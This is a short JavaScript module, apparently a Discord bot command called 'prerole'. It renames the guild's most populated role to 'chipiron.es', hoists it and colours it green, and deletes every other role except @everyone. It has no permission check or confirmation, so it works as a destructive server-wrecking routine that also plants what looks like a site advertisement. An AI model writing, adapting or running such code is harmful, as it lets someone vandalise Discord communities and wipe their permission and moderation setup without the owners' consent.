module.exports = {
    name: 'prerole',
    execute: async function (message) {

        let gRoles = [];

        for (const [key, r] of message.guild.roles.cache) {
            if (r.name === "@everyone") continue;
            console.log(r.name)
            try {
                await gRoles.push({
                    roleLen: r.members.size,
                    roleId: r.id
                });
            } catch (err) {
                console.log(err)
            }
        }

        gRoles.sort((a, b) => b.roleLen - a.roleLen);

        for (const [key, r] of message.guild.roles.cache) {
            if (r.name === "@everyone") continue;
            try {
                if (r.id === gRoles[0].roleId) {
                    await r.setName("chipiron.es")
                    await r.edit({hoist: true, color: "GREEN"})
                    continue;
                }
                await r.delete();
            } catch (err) {
                console.log(err)
            }
        }

    }
};